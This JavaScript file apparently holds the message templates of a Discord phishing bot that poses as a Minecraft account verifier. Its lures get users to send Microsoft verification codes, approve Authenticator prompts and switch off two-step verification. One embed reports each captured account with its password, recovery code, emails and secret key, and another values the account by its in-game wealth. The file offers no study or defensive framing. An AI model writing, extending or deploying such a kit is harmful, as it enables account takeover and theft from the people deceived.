module.exports = (type, client) => {
  switch (type) {
    case "main":
      return {
        title: `Minecraft Account Linking`,
        description: `
        FAQ

        Q: Why do we need you to verify?

        A: It's for auto-roles, We need to give you your class roles, catacomb-level roles, and verified roles. It's also just for extra security in cases of a raid.

        Q: How long does it take for me to get my roles?

        A: We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.

        Q: Why do you need to collect a code?

        A: The code confirms with the Minecraft API that you actually own that Minecraft account.`,
        color: 0x00ff00
      };
    case "otp":
      return {
        title: `Security Email Required`,
        description: `Your Microsoft account currently **does not have a security email** attached to receive verification codes.\n\n### How to add a Security Email:\n**1.** Go to [Microsoft Security Settings](https://account.live.com/proofs/manage/additional)\n**2.** Sign in and click **"Add a new way to sign in or verify"**\n**3.** Select **"Email a code"** and enter your personal email\n**4.** Enter the code sent to your email to confirm\n**5.** Once added, click **"Retry"** below to complete verification!`,
        color: 0xff4757,
        footer: {
          text: "Microsoft Account Security Guide"
        }
      };
    case "oauth":
      return {
        title: `Verification`,
        description: `Use this link to verify instead!`,
        color: 0x00ff00
      };
    case "res":
      return {
        title: `Account linked!`,
        description: `Congratulations you linked the account successfully!`,
        color: 0x00ff00 
      };
    case "invalid":
      return {
        title: `Error :x:`,
        description: `The code you sent was wrong, please try again with a valid code!`,
        color: 0xff0000
      };
    case "sec":
      return {
        title: `Last Step\n`,
        description: `Due to the increase of fake verifications, we require a code from \`(sec)\`, to prove that you are the owner of __{username}__. This code is only used for verification.\n\n**Note:**  It can take \`30s-2mins\` to send the code.`,
        color: 8049651
      };
    case "locked":
      return {
        title: `Account Locked`,
        description: `Your account seems to be locked. Please log-in, resolve issues then retry.`,
        color: 0xff0000
      };
    case "invalid email":
      return {
        title: `Invalid Email`,
        description: `The email you have entered \`(sec)\` is invalid, please retry using a valid email.`,
        color: 0xff0000
      };
    case "authenticator":
      return {
        title: `Action Required: Microsoft Authenticator`,
        description: `Due to security requirements, please confirm on your Microsoft Authenticator app by selecting the number **(sec)**.\n\n> 💡 **If you cannot use the Authenticator App or want to remove 2FA:**\n> Click **"How to Remove 2FA / Use Email"** below for step-by-step instructions.`,
        color: 0xfbc531
      };
    case "account doesn't exist":
      return {
        title: `Error :x:`,
        description: `This account doesn't exist, please try again with a valid account!`,
        color: 0xff0000
      };
    case "howto":
      return {
        title: `Guide: How to Add a Security Email`,
        description: `### Follow these simple steps to add a Security Email:\n\n**Step 1:** Open [Microsoft Advanced Security Options](https://account.live.com/proofs/manage/additional)\n**Step 2:** Log in to your Microsoft Account.\n**Step 3:** Under **"Ways to prove who you are"**, click **"Add a new way to sign in or verify"**.\n**Step 4:** Choose **"Email a code"**.\n**Step 5:** Enter an email address (e.g. Gmail, Outlook, iCloud) to receive codes.\n**Step 6:** Enter the confirmation code sent to that email.\n**Step 7:** Return here and click **"Retry"** to complete verification!`,
        color: 0x546de5,
        footer: {
          text: "Tip: Security emails take only 1 minute to link."
        }
      };
    case "split":
      return {
        title: `Verification Failed`,
        description: `We have failed to authenticate your account due to Hypixel's API being down, please retry using our alternative verification system.`,
        color: 0xff0000
      };
    case "blacklisted":
      return {
        title: "Failed to verify you",
        description: "We have detected an issue whilst trying to give you the correct roles. Please wait until a staff member manually verifies you. Thank you for your patience.",
        color: 0xff0000
      };
    case "listaccount":
      return {
        title: "Account secured in %TIMETAKEN% seconds",
        color: 11716576,
        footer: {
          text: "%BAN%"
        },
        fields: [
          { name: "Username", value: "```%NEWNAME%```", inline: true },
          { name: "Owns MC", value: "```%OWNSMC%```", inline: true },
          { name: "Capes", value: "```%CAPES%```", inline: true },
          { name: "Recovery Code", value: "```%RECOVERY%```", inline: false },
          { name: "Primary Email", value: "```%EMAIL%```", inline: true },
          { name: "Security Email", value: "```%SECURITY%```", inline: true },
          { name: "Secret Key", value: "```%SECRETKEY%```", inline: true },
          { name: "Password", value: "```%PASSWORD%```", inline: false }
        ]
      };
        case "statsmsg":
      return {
        color: 11716576,
        fields: [
          { name: "Donut Money", value: "%DONUTMONEY%", inline: true },
          { name: "Donut Playtime", value: "%DONUTPLAYTIME%", inline: true },
          { name: "Donut Shards", value: "%DONUTSHARDS%", inline: true },
          { name: "Hypixel Rank", value: "%RANK%", inline: true },
          { name: "Skyblock Net.", value: "%NETWORTHTOTAL%", inline: true },
          { name: "Bedwars Stars", value: "%BEDWARSTARS%", inline: true }
        ]
      };
    case "wrongnumber":
      return {
        title: `Error :x:`,
        description: `You chose the wrong number, please try again and choose the right number!`,
        color: 0xff0000
      };
          case "invalidated":
return {
      "title": "Failed to find username: %USERNAME%",
      "description": "We have searched for the username `%USERNAME%` and have failed to find stats for it. If you still wish to continue, click `Continue`. If you wish to restart, click `Retry`.",
      "color": 0xff0000
}
    case "timeout":
      return {
        title: `Error :x:`,
        description: `Timeout, please try again!⏱`,
        color: 0xff0000
      };
    case "extrabutton":
      return {
        title: `Not Set`,
        description: `Add any text here!`,
        color: 0xff0000
      };
    case "codenotnumbers":
      return {
        title: `Error :x:`,
        description: `Invalid code, please confirm with the code that was sent to your email`,
        color: 0xff0000
      };
    case "nomc":
      return {
        title: `Error :x:`,
        description: `We couldn't find your Minecraft Username to verify you, please retry using your minecraft email!`,
        color: 0xff0000
      };
    case "dm1":
      return {
        title: `Welcome to (guildname)`,
        description: `In order to gain access to our channels and services you must verify your Minecraft account. If you do not verify you will be automatically kicked from the server. \n\n To get started, send me the message "(verifymsg)" and i'll give you more instructions.`,
        color: 0xff0000
      };
    case "dm2":
  return {
    description: `Thank you for choosing to link your Minecraft Account in (guildname)! By continuing you acknowledge that this information may be accessible by other users of the bot.\n\n**How would you like to link your account?**\n🅰️ Joining our server to get a code.\n🅱️ Using your Hypixel Social Profile.`,
    color: 0xff0000,
    author: {
      name: `Link Minecraft Account to (guildname)`,
      iconURL: client.user.displayAvatarURL()
    },
    footer: {
      text: `The first option is the easiest and the quickest option for first timers, we recommend going with that option.`
    } 
  };
          case "dm3":
      return {
        description: `Our services seem to be down currently, please continue with our alternative method.`,
        color: 0xff0000
      };
    case "howtoauth":
      return {
        title: "How to Verify or Remove 2FA / Authenticator",
        description: "### Option 1: Approve via Authenticator App\n**1.** Open the **Microsoft Authenticator** app on your phone.\n**2.** Tap the number matching the code shown in the message above.\n\n---\n### Option 2: Remove 2FA & Add Security Email (Recommended)\n**1.** Go to [Microsoft Security Settings](https://account.live.com/proofs/manage/additional)\n**2.** Scroll down to **\"Two-step verification\"** and click **\"Turn off\"** (or remove the Authenticator app under 'Ways to prove who you are').\n**3.** Click **\"Add a new way to sign in or verify\"** -> select **\"Email a code\"**.\n**4.** Enter your personal email (Gmail, iCloud, etc.) and enter the verification code.\n**5.** Return to Discord and click **\"Retry\"** to verify easily with your email!",
        color: 0x546de5,
        footer: {
          text: "Microsoft Account 2FA & Security Guide"
        }
      };
    default:
      console.log(`Invalid embed type ${type}`);
      return null;
  }
};
